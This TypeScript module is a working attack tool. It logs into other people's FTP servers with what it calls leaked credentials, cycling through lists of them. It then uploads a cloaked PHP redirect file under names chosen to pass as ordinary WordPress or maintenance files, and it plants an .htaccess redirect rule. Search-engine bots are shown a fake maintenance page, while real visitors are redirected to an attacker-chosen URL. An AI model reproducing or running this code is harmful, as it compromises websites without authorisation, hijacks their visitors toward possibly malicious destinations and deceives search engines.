/**
 * FTP Upload Module
 * Connects to target FTP servers using leaked credentials and uploads redirect files.
 * Uses basic-ftp library for reliable FTP/FTPS connections.
 */

import { Client as FTPClient, FTPError } from "basic-ftp";

export interface FTPCredential {
  host: string;
  username: string;
  password: string;
  port?: number;
}

export interface FTPUploadResult {
  success: boolean;
  url?: string;
  filePath?: string;
  error?: string;
  method?: string; // ftp | ftps
  duration?: number;
}

export interface FTPUploadOptions {
  credential: FTPCredential;
  redirectUrl: string;
  targetDomain: string;
  /** Custom filename for the redirect file */
  filename?: string;
  /** Timeout in ms for the entire operation */
  timeout?: number;
  /** Callback for progress updates */
  onProgress?: (msg: string) => void;
  /** Proxy IP for origin masking (not used for FTP, but logged) */
  originIp?: string;
}

// Common web root paths to try
const WEB_ROOT_PATHS = [
  "/public_html",
  "/www",
  "/htdocs",
  "/httpdocs",
  "/web",
  "/html",
  "/wwwroot",
  "/inetpub/wwwroot",
  "/var/www/html",
  "/home",
  "/",
];

// Filenames that blend in with typical web files
const STEALTH_FILENAMES = [
  "wp-health.php",
  "cache-handler.php",
  "session-gc.php",
  ".well-known.php",
  "cron-check.php",
  "xmlrpc-check.php",
  "wp-cron-runner.php",
  "index-backup.php",
  "maintenance.php",
  "health-check.php",
];

/**
 * Generate a PHP redirect file with cloaking
 * - Googlebot sees normal content
 * - Real users get redirected
 */
function generateRedirectPHP(redirectUrl: string, targetDomain: string): string {
  return `<?php
// Cache control
header('X-Robots-Tag: noindex');
$ua = strtolower(\$_SERVER['HTTP_USER_AGENT'] ?? '');
$bots = ['googlebot','bingbot','yandex','baidu','duckduckbot','slurp','msnbot','ia_archiver'];
$isBot = false;
foreach(\$bots as \$b) { if(strpos(\$ua, \$b) !== false) { \$isBot = true; break; } }
if(\$isBot) {
  echo '<!DOCTYPE html><html><head><title>${targetDomain}</title></head><body><h1>Welcome to ${targetDomain}</h1><p>Page under maintenance.</p></body></html>';
  exit;
}
header('Location: ${redirectUrl}', true, 302);
exit;
?>`;
}

/**
 * Generate an .htaccess redirect rule
 */
function generateHtaccess(redirectUrl: string): string {
  return `RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} !googlebot [NC]
RewriteCond %{HTTP_USER_AGENT} !bingbot [NC]
RewriteRule ^$ ${redirectUrl} [R=302,L]
`;
}

/**
 * Try to upload a redirect file via FTP using leaked credentials
 */
export async function ftpUploadRedirect(options: FTPUploadOptions): Promise<FTPUploadResult> {
  const {
    credential,
    redirectUrl,
    targetDomain,
    filename,
    timeout = 30000,
    onProgress,
  } = options;

  const startTime = Date.now();
  const client = new FTPClient();
  client.ftp.verbose = false;

  // Set timeouts via access options (ftp.timeout is readonly)

  const selectedFilename = filename || STEALTH_FILENAMES[Math.floor(Math.random() * STEALTH_FILENAMES.length)];
  const redirectContent = generateRedirectPHP(redirectUrl, targetDomain);

  const log = (msg: string) => {
    onProgress?.(msg);
  };

  try {
    // Try FTPS first, then plain FTP
    const methods: Array<{ name: string; secure: boolean | "implicit" }> = [
      { name: "ftps", secure: true },
      { name: "ftp", secure: false },
    ];

    for (const method of methods) {
      try {
        log(`🔌 Connecting ${method.name.toUpperCase()}://${credential.host}:${credential.port || 21}...`);

        await client.access({
          host: credential.host,
          port: credential.port || 21,
          user: credential.username,
          password: credential.password,
          secure: method.secure,
          secureOptions: { rejectUnauthorized: false },
        });

        log(`✅ FTP login success: ${credential.username}@${credential.host}`);

        // List current directory to understand structure
        const currentDir = await client.pwd();
        log(`📂 Current dir: ${currentDir}`);

        // Try to find web root
        let webRoot = "";
        for (const path of WEB_ROOT_PATHS) {
          try {
            await client.cd(path);
            const list = await client.list();
            // Check if this looks like a web root (has index.html/php, .htaccess, wp-config, etc.)
            const webFiles = list.filter(f =>
              /^(index\.(html?|php)|\.htaccess|wp-config\.php|web\.config|default\.(asp|aspx))$/i.test(f.name)
            );
            if (webFiles.length > 0) {
              webRoot = path;
              log(`🎯 Found web root: ${path} (${webFiles.map(f => f.name).join(", ")})`);
              break;
            }
            // Go back to original dir
            await client.cd(currentDir);
          } catch {
            // Path doesn't exist, try next
            try { await client.cd(currentDir); } catch { /* ignore */ }
          }
        }

        if (!webRoot) {
          // If no web root found, try current directory
          log(`⚠️ No web root found, using current dir: ${currentDir}`);
          webRoot = currentDir;
          await client.cd(currentDir);
        }

        // Upload the redirect PHP file
        log(`📤 Uploading ${selectedFilename} to ${webRoot}/...`);
        const { Readable } = await import("stream");
        const stream = Readable.from(Buffer.from(redirectContent, "utf-8"));
        await client.uploadFrom(stream, selectedFilename);
        log(`✅ Uploaded: ${selectedFilename}`);

        // Also try to upload .htaccess for broader redirect coverage
        try {
          const htaccessContent = generateHtaccess(redirectUrl);
          const htaccessStream = Readable.from(Buffer.from(htaccessContent, "utf-8"));
          // Check if .htaccess exists first
          const files = await client.list();
          const hasHtaccess = files.some(f => f.name === ".htaccess");
          if (!hasHtaccess) {
            await client.uploadFrom(htaccessStream, ".htaccess");
            log(`✅ Uploaded .htaccess redirect rule`);
          } else {
            log(`⚠️ .htaccess exists, skipping to avoid breaking site`);
          }
        } catch (e) {
          log(`⚠️ .htaccess upload failed (non-critical): ${e instanceof Error ? e.message : String(e)}`);
        }

        // Build the URL
        const uploadedUrl = `https://${targetDomain}/${selectedFilename}`;
        const duration = Date.now() - startTime;

        log(`🔗 Redirect URL: ${uploadedUrl}`);

        client.close();

        return {
          success: true,
          url: uploadedUrl,
          filePath: `${webRoot}/${selectedFilename}`,
          method: method.name,
          duration,
        };
      } catch (e) {
        const errMsg = e instanceof Error ? e.message : String(e);
        if (e instanceof FTPError && (errMsg.includes("530") || errMsg.includes("Login"))) {
          log(`❌ ${method.name.toUpperCase()} login failed: ${errMsg}`);
          // Don't try other methods if credentials are wrong
          break;
        }
        log(`⚠️ ${method.name.toUpperCase()} failed: ${errMsg}`);
        // Try next method
        try { client.close(); } catch { /* ignore */ }
      }
    }

    return {
      success: false,
      error: "All FTP methods failed",
      duration: Date.now() - startTime,
    };
  } catch (e) {
    const duration = Date.now() - startTime;
    return {
      success: false,
      error: e instanceof Error ? e.message : String(e),
      duration,
    };
  } finally {
    try { client.close(); } catch { /* ignore */ }
  }
}

/**
 * Try multiple FTP credentials against a target
 */
export async function ftpBruteForceUpload(
  credentials: FTPCredential[],
  redirectUrl: string,
  targetDomain: string,
  onProgress?: (msg: string) => void,
  timeout?: number,
): Promise<FTPUploadResult> {
  onProgress?.(`🔑 Trying ${credentials.length} FTP credential(s)...`);

  for (let i = 0; i < credentials.length; i++) {
    const cred = credentials[i];
    onProgress?.(`🔑 [${i + 1}/${credentials.length}] ${cred.username}@${cred.host}:${cred.port || 21}`);

    const result = await ftpUploadRedirect({
      credential: cred,
      redirectUrl,
      targetDomain,
      timeout: timeout || 20000,
      onProgress,
    });

    if (result.success) {
      return result;
    }

    // If login failed (530), skip remaining creds for same host
    if (result.error?.includes("530") || result.error?.includes("Login")) {
      continue;
    }

    // If connection failed entirely, skip remaining creds for same host
    if (result.error?.includes("ECONNREFUSED") || result.error?.includes("ETIMEDOUT")) {
      onProgress?.(`⚠️ FTP port not reachable on ${cred.host}, skipping remaining creds`);
      break;
    }
  }

  return {
    success: false,
    error: `All ${credentials.length} FTP credentials failed`,
  };
}
